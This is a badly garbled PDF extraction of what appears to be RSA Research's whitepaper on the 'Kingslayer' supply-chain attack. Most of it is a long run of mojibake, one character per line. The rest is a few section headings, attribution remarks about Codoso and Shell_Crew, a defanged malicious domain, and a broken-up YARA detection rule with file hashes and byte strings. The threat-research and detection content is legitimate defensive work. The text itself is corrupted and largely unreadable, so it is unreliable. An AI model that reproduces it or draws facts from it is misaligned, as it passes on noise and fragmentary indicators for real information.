fb02\n0\n;\n\ufb02\n\u00bc\n\ufb02\n\u00e2\n\u00e2\n\u00b0\n4\n\ufb02\n0\nH\n\u00bc\n\u00b9\n\u00bc\n\u00bd\n\u00c1\n\u00bc\n\u00c5\n\u00f4\n%\nF\n\u02d9\n\u00be\nj\n\u00c9\nT\n;\n,\n\u00c7\n\u2021\n\u00c7\nT\n;\nF\n\u00f6\n,\nH\n\u2021\n\u00b0\n4\n\ufb02\n0\nH\n\u00c7\n\u00b1\n\u00c7\n\u2021\n>\nH\n\ufb02\n\u00f8\n\u00c9\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\n\u00c7\n\u00fa\n4\n~\n>\n\u00e2\nH\nH\n0\n\u00c7\n\u00db\n\ufb02\n\u00bc\n\u00c4\n\u00bb\n\u00b9\n\u00c1\n\u00bc\n\u00c4\n\u00f4\nF\n\u02d9\n\u00fb\n\u00ff\n\u00c9\n\u02d9\n\u00ff\n\u00c9\n\u00a7\n\u00be\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n0\n>\n\u2021\n\u00db\n\u2030\n0\n4\n\u00fa\n4\n0\n\ufb02\n>\n\u2021\n\u00fa\n\u00ba\n\u00bc\n\u00ea\n~\n\u00c1\n\u00be\n\u00bd\n\u00eb\n\u00bc\n\u00c4\n\u00bc\n\u00c4\n\u00bd\n\u00bb\n\u00c3\n\u00f4\nF\n\u02d9\n\u00fb\n\u00ff\n\u00c9\n\u02d9\n\u00ff\n\u00c9\n\u00a7\n\u00be\n\u00c9\n0\n\u201c\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n0\n>\n\u2021\n\u00db\n\u2030\n0\n4\n\u00f6\n\u00f6\nT\n\u00fa\n\u00c7\n\u2021\n>\nH\n\u00c7\n\u00fa\n\u00b3\nw\n\u00c7\nH\n\u00bc\n4\n\u00fa\n4\n\u00bc\n\u00c4\n\u00bc\n\u00c4\n\u00bd\n\u00bb\n\u00c1\n\u00f4\nF\n\u02d9\n\u00fb\n\u00ff\n\u00c9\n\u02d9\n\u00ff\n\u00c9\n\u00a7\n\u00be\n\u00c9\n0\n\u201c\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n0\n>\n\u2021\n\u00db\n\u2030\n0\n\ufb02\n\u00fa\n\u2030\n\u00c7\n\u00fa\n\u00b3\n\u00fb\n>\n;\n;\nw\n0\n\u2030\nH\n4\n\u00fa\n4\n,\n,\n\ufb02\n\u00fa\n\u2030\n\u00c7\n\u00c9\n0\n\u201c\n\u02d9\n0\n>\n\u00b1\n\u00b1\n\u00c7\n\u2021\n=\n\ufb02\n\u2021\n\u2030\n\ufb02\n0\nt\n>\n0\n2\n\u00db\n\ufb02\n\u2021\nH\n0\n$\n\u00ba\nd\nj\n\u00f3\nP\n\u00be\n\u00bc\nM\n\u00db\n\u2021\n4\n~\n/\n\u00c9\n\u00c7\n\u00fb\n>\n\u00d9\n\u00bc\n\u00fa\n\u00a9\nH\n\u00fe\nw\n;\n\u00c4\n\u00be\n\u00ff\n0\n\u00bb\n\u00c1\nW\n\u00a7\n,\nT\n$\n\u00b9\n\u00f6\n\u00b3\nF\n\u00bd\n\u02d9\nu\nl\n\u00b0\n\u00e2\nt\n\u201c\n\u00c5\n&\n\u00c0\n0\n=\nZ\n\u2030\n\u00c3\n\u00b1\n\ufb02\n\u2021\n&\n\u02d8\n\u00b1\nT\n\u00fa\n\u2021\nH\n\u00c7\n\u00fa\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00ea\n\u00c7\n\u00fa\n,\nT\nH\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\nT\nH\n,\nT\nH\n$\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\n\u2021\n\u00bc\n0\n\u00bb\n\u2021\n\u00bc\n0\n\u00bc\n\u2021\n\u00bc\n0\n\u00bd\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\n\ufb02\n\u00fa\n\u2021\n\u00bb\n\ufb02\n\u00fa\n\u2021\n\u00bc\n\ufb02\n\u00fa\n\u2021\n\u00bd\n\ufb02\n\u00fa\n\u2021\n\u00be\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\n\u00c7\n$\n\u00b9\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n\u00fa\n,\nT\nH\n$\n\u00c7\n\u00fa\n,\nT\nH\n0\n\ufb02\n,\n\u00e2\n>\n\u2021\n\ufb02\n\u00ea\n\u00f3\n\u00ec\n5\n\u00f8\nd\n>\n\u00f8\n\u201c\n\u00b9\n\u00f8\n\u00c5\n\u00f6\n&\n\u00f6\n\u00f3\n\u00f6\n$\n\u00ed\n\u00f3\n\u00b3\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nw\n\u00bc\n\u00c7\n\u00e2\n\ufb02\n\u00ea\n\u00c7\n \n\u00c7\n\u00fa\n,\nT\nH\n\u00e2\n\ufb02\n\u00fa\n\u00b3\nH\n\u00bc\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\ufb02\n\u00fa\n\u2021\n\u00bb\n$\nH\n\u00bc\n\u00c7\n;\n2\n\u00db\n\ufb02\n\u2021\nH\n0\n\u00c7\n\u00fa\n\u2030\n\ufb02\n\u00c9\n\u00b1\n\u00ea\n\u00c7\n\u00fa\n,\nT\nH\n\u2021\n\u00bc\n>\n0\nH\n\u00ea\n\u00c7\n&\n&\n\u00eb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\ufb02\n\u00fa\n\u2021\n\u00bc\n$\nH\n\u00bc\n\u00c7\n;\n2\n\u00db\n\ufb02\n\u2021\nH\n0\n\u00c7\n\u00fa\n\u2030\n\ufb02\n\u00c9\n\u00b1\n\u00ea\n\u00c7\n\u00fa\n,\nT\nH\n\u2021\n\u00bc\n>\n0\nH\n\u00ea\n\u00c7\n&\n&\n\u00eb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\ufb02\n\u00fa\n\u2021\n\u00bd\n$\nH\n\u00bc\n\u00c7\n;\n2\n\u00db\n\ufb02\n\u2021\nH\n0\n\u00c7\n\u00fa\n\u2030\n\ufb02\n\u00c9\n\u00b1\n\u00ea\n\u00c7\n\u00fa\n,\nT\nH\n\u2021\n\u00bc\n>\n0\nH\n\u00ea\n\u00c7\n&\n&\n\u00eb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\ufb02\n\u00fa\n\u2021\n\u00be\n$\nH\n\u00bc\n\u00c7\n;\n2\n\u00db\n\ufb02\n\u2021\nH\n0\n\u00c7\n\u00fa\n\u2030\n\ufb02\n\u00c9\n\u00b1\n\u00ea\n\u00c7\n\u00fa\n,\nT\nH\n\u2021\n\u00bc\n>\n0\nH\n\u00ea\n\u00c7\n&\n&\n\u00eb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n\u00bc\n0\n\u00bb\n$\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00bb\n \n \n\u00bc\n\u00eb\n\u00f4\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00bc\n!\n!\n\u00be\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n\u00bc\n0\n\u00bc\n$\n\u00ea\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00bc\n\u00e5\n\u00bb\n\u00c0\n\u00eb\n \n \n\u00be\n\u00eb\n\u00f4\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00bd\n!\n!\n\u00bc\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n\u00bc\n0\n\u00bd\n$\n\u00ea\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00bd\n\u00e5\n\u00bd\n\u00eb\n \n \n\u00c1\n\u00eb\n\u00f4\n\ufb02\n\u00fa\n\u2021\n\u00be\n\u02d8\n %\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nT\nH\n,\nT\nH\n$\nT\nH\n,\nT\nH\n&\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n4\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\n\u00ea\n\u2021\n\u00bc\n0\n\u00bb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n\u00b1\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00bd\n\u00e6\n$\n\u00c1\n\u00be\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nT\nH\n,\nT\nH\n$\nT\nH\n,\nT\nH\n&\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n4\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\n\u00ea\n\u2021\n\u00bc\n0\n\u00bc\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n\u00b1\n\u00ea\n\ufb02\n\u00fa\n\u2021\n\u00be\n\u00e6\n$\n\u00c1\n\u00be\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nT\nH\n,\nT\nH\n$\nT\nH\n,\nT\nH\n&\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n4\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\n\u00ea\n\u2021\n\u00bc\n0\n\u00bd\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nT\nH\n,\nT\nH\n$\nH\n\u00bc\n\u00c7\n;\n2\nT\nH\n\u00b1\n\u00c4\n2\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00ea\nT\nH\n,\nT\nH\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n0\n\ufb02\nH\nT\n0\n\u00fa\nT\nH\n,\nT\nH\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n\u00b1\nT\n\u00fa\n\u2021\nH\n\u00c7\n\u00fa\n2\nT\nH\n\u00b1\n\u00c4\n2\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00ea\nT\nH\n\u00b1\nH\n\ufb02\nH\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n$\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\n\u00c7\n$\n\u00b9\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nt\n>\n0\n\u2021\n$\n\u2021\n\u00bb\n$\n\u2021\n\u00bc\n$\n\u00b9\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\nw\n\u00bc\n\u00c7\n\u00e2\n\ufb02\n\u00ea\n\u00c7\n \nT\nH\n\u00b1\nH\n\ufb02\nH\n\u00e2\n\ufb02\n\u00fa\n\u00b3\nH\n\u00bc\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n$\nT\nH\n\u00b1\nH\n\ufb02\nH\n\u2021\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\nH\n\u00ea\n\u00c7\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n\u00b1\n\u00ea\n\u2021\n \n\u00bb\n\u00bc\n\u00c4\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n&\n$\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n4\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\n\u00ea\n\u2021\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n&\n&\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n\ufb02\n\u00e2\n;\n\ufb02\n\u00c7\n\u00b1\n\u00ea\n\u00ea\n\u2021\n!\n\u00bb\n\u00c5\n\u00bb\n\u00eb\n\u00e5\n\u00e5\n\u00ea\n\u2021\n \n\u00bc\n\u00bc\n\u00be\n\u00eb\n\u00eb\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n\u00bc\n$\nT\nH\n\u00b1\nH\n\ufb02\nH\n\u2021\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\nH\n\u00ea\n\u00c7\n&\n\u00bb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n&\n$\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n4\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\n\u00ea\n\u00ea\n\u00ea\n\u2021\n\u00e5\n\u00bd\n\u00bb\n\u00eb\n \n \n\u00c1\n\u00eb\n\u00f4\n\u00ea\n\u2021\n\u00bc\n\u00e5\n\u00c1\n\u00bd\n\u00eb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n&\n$\n\u00bc\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n\ufb02\n\u00e2\n;\n\ufb02\n\u00ee\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n\u00bc\n$\nT\nH\n\u00b1\nH\n\ufb02\nH\n\u2021\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\nH\n\u00ea\n\u00c7\n&\n\u00bb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u2021\n\u00bd\n$\nT\nH\n\u00b1\nH\n\ufb02\nH\n\u2021\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\nH\n\u00ea\n\u00c7\n&\n\u00bc\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n&\n$\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u00b1\n0\n\u00f6\n4\n\u00bc\n>\n0\n4\n\u2030\n\ufb02\n\u00ea\n\u00ea\n\u00ea\n\u2021\n\u00e5\n\u00bb\n\u00c0\n\u00eb\n \n \n\u00bb\n\u00bc\n\u00eb\n\u00f4\n\u00ea\n\u00ea\n\u2021\n\u00bc\n\u00e5\n\u00c1\n\u00bd\n\u00eb\n \n \n\u00c1\n\u00eb\n\u00f4\n\u00ea\n\u2021\n\u00bd\n\u00e5\n\u00c1\n\u00bd\n\u00eb\n\u00eb\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00c7\n&\n$\n\u00bd\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n0\n\ufb02\nH\nT\n0\n\u00fa\n;\nH\n0\n\u00c7\n\u00fa\n\u00b3\n\u02d8\n%\n%\n%\n%\n%\n%\n%\n%\n%\n%\n\u00ef\nt\n>\n0\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00f6\n\ufb02\n$\n;\n\u00bc\n\u00c5\n\u00be\nj\n\u00b9\nl\n4\n0\n\u00ff\n0\n\u00ff\nt\nZ\n\u00c5\n;\n\u00bc\n,\n\u201c\n\u00be\n\u00c0\n\u00fa\nu\n;\n0\n\u00db\n&\n\u00be\n\u00bc\n\u02d9\n\u00c4\n\u00a9\nP\nt\n;\n\u00a9\nZ\n,\n\u00be\n0\n,\n\u201c\n\u00ff\n\u00be\n\u00fa\n\u02d9\n\u00be\nt\nZ\nl\n\u00be\nT\n\u00be\n\u2030\n\u00c9\nj\n=\n~\nd\n\ufb02\n\u02d9\n\u00fe\nH\n\u00db\n\u00f6\n\u00c4\nT\n\u00fa\n\u201c\nH\n/\n\u00c5\nw\n\u00a9\n&\n\u201c\n4\n\u00b0\nt\n>\n0\n0\n\ufb02\n;\n$\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00ea\n\u2030\n\ufb02\n\u2021\n\u2030\n\ufb02\n\u00f6\n\ufb02\n\u00eb\n\u02d8\n \u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\nw\n0\n\u00c7\nH\n\ufb02\n\u00ea\n0\n\ufb02\n;\n\u00eb\n\u02d8\n ", "\u02d8\n      \u02d8\n \u02dd\n ", "        \u00be\u00ed\n\u00be\u00df\n \u00be\u00ed\n\u00be\u00ae\n   ", "WHITEPAPER\nKINGSLAYER\u0152 A SUPPLY \nCHAIN ATTACK\nRSA RESEARCH\n CONTENTS\nContent and liability disclaimer\n \n03\n\n\nTargeted takedown of Codoso malware\n \n05\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 3\nCONTENT AND LIABILITY DISCLAIMER \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n EXECUTIVE SUMMARY\n\n\n\n\n\n\n\n\nSUMMARY\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u00ae\n\n\n\n\n\n\n 5\nTARGETED TAKEDOWN OF CODOSO MALWARE\n\n\n\n\n. We did not know what was causing \n\n\n\n3\n\n\n\n\nrecommend reading the Schoolbell report.\n\n\n\n 3 \n\n\nA NOTE ABOUT \nATTRIBUTION\n \nThe malware and activities \ndescribed in the Kingslayer \npost-mortem report shares code, \ntactics and unique malware \nartifacts with a large amount \nof other malware employed by \nactors in campaigns attributed to \nvarious named threat groups. RSA \nResearch has, for years, dubbed \nthis group of common tools and \ntactics Shell_Crew, since the first \nRSA Shell_Crew report released \nin 2014. \nHowever, shared malware \ndevelopment supply and \ninfrastructure does not \nnecessarily indicate that the \nespionage-focused actors behind \nthe keyboards in this campaign, \nare all the same people as \ncampaigns analyzed by other \nresearchers.  Refer to the section \n\ufb01Kingslayer connections to \nCodoso and Shell_Crew\ufb02 for more \ndetails.\nIt\u2122s important to note threat \nactors often use domains which \nlook like popular, well known \ndomains, even going so far to \ntemporarily \ufb01park\ufb02 them on IP \naddresses associated with the \nlegitimate entities  \u0152 but they \nhave no link to the legitimate \ndomain or company, as is the case \nthroughout this research.\n \n\n UNEXPECTED FINDING\nWe did not know what malware type might be using the domain www.oracle\n\n\n\n\n\n\n\nA BACKDOOR IN PRODUCT USED BY SYSADMINS\n\n\n\nWindows system administrators interpret and troubleshoot problems indicated \n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nin the RSA Research lab was the employment of an unusual diurnal beacon \nsleep algorithm. \n\n\n\n\n\n\nexecutable analysis in Appendix A.\n TARGETED TAKEDOWN AND SINKHOLING OF \n \nWWW.ORACLESOFT[.]NET\n\n\n\n\n\n\n\n\n\nAN IRRESISTIBLE ENTICEMENT FOR KINGSLAYER \nACTORS\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ELEVEN AND A HALF WEEKS\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n KINGSLAYER CONNECTIONS TO CODOSO AND \nSHELL_CREW\n\n\n\n5\n\n\n  and ProofPoint \n  in \n\n\n\n\n\nmalware for which no builder or source code has been found in the wild. These \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n5 \n\n\n\n RECALLING ANOTHER SOFTWARE SUPPLY-CHAIN \nATTACK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwild. \n\n\n \n\n(available for download in Annex 1)\n\n\n KINGSLAYER\u2122S MEMORY-RESIDENT BROTHER, THE \nK2 TROJAN\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \nWHY SOFTWARE SUPPLY-CHAIN ATTACKS ARE HERE \nTO STAY\n\n\n\n\n\n\n\ntargets\n .\n\n\n\n\n\n\n\n\n\n\n\n \n\n\na large enterprise. \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSOFTWARE VENDORS, AND SYSADMINS ON NOTICE\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ncustomers  \n Enterprise network administrators should take heed that they are perhaps \n\nmight be found on those enterprise networks\n\n\n\n\n\n . \nHOW WAS THE KINGSLAYER INVESTIGATION \n \nINFORMED?\n\n\n\n\n\n\n\n\n\n\n\n\nDETECTION OF KINGSLAYER, AND THE NEXT SOFT\n-\nWARE SUPPLY CHAIN ATTACK\n\n\n\n\ncampaign. \n\n\n\n\n\n\n\n\n\n RSA NETWITNESS\n\u00ae\n ENDPOINT EDR TOOL\n\n\u00ae\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\ndomain.\n\nRSA NETWITNESS PACKETS AND LOGS\n\n\n\n\n\n\nreducing business risk.\n\n\n\n\n\n\n\n \n\n\n\n\n\nguide\n.\n\n HOW TO INVESTIGATE IF YOU MIGHT HAVE BEEN \nCOMPROMISED BY KINGSLAYER\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbreach be indicated.\nCONCLUSION\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nmission.\n ACKNOWLEDGEMENTS\n\n\n\n.\n\n\n 2\n0\nANNEX\n 1: \nKING\nSL\nA\nY\nER\n \nIN\nD\nI\nC\nA\nT\nOR\nS \nO\nF \n \nC\nO\nM\nPRO\nM\nI\nS\nE\n (\nIO\nCS\n)\nDo\nwnl\no\nad \nav\na\ni\nlable \no\nn \nr\nsa.\nc\no\nm\n1\n5\nY\na\nr\na \nS\nig\nn\na\ntu\nr\ne\n:\nrule K\ni\nn\ng\nsl\na\ny\ner_\nc\no\nde\nk\ne\ny\n{\nm\ne\nta\n:\n \n \nauth\no\nr\n \n=\n \ufb01R\nS\nA\n \nR\nesea\nr\nc\nh\n\ufb02\n \n \nd\na\nt\ne \n=\n \ufb01\n03\n \nF\nebruar\ny\n \n2017\n\ufb02\n \n \n \nhash\n2\n \n=\n \ufb01f\n97\na\n2744\na\n4964044\nc\n60\nac\n241\nf\n92\ne\n05\nd\n7\n\ufb02\n \nhash\n3\n \n=\n \ufb01\n76\nab\n4\na\n360\nb\n59\nf\ne\n99\nbe\n1\nba\n7\nb\n9488\nb\n5188\n\ufb02\n \nhash\n4\n \n=\n \ufb01\n1\nb\n57396\nc\n834\nd\n2\neb\n364\nd\n28\neb\n0\neb\n28\nd\n8\ne\n4\n\ufb02\nstr\ni\nn\ng\ns\n:\n \n$\nv\nal\n0\n \n=\n \n{\n \n31\n \n33\n \n31\n \n31\n \n30\n \n34\n \n31\n \n39\n \n33\n \n39\n \n31\n \n39\n \n5\nA\n \n17\n \n0\nD\n \n31\n \n35\n \n31\n \n31\n \n30\n \n34\n \n3\n1 \n39\n \n33\n \n39\n \n31\n \n39\n \n5\nA\n \n}\n \n$\nv\nen\n0\n \n=\n { \n41\n \n6\nC \n74\n \n61\n \n69\n \n72\n \n20\n \n54\n \n65\n \n63\n \n68\n \n6E\n \n6\nF\n \n6\nC \n6\nF\n \n67\n \n69\n \n65\n \n73\n \n}\n 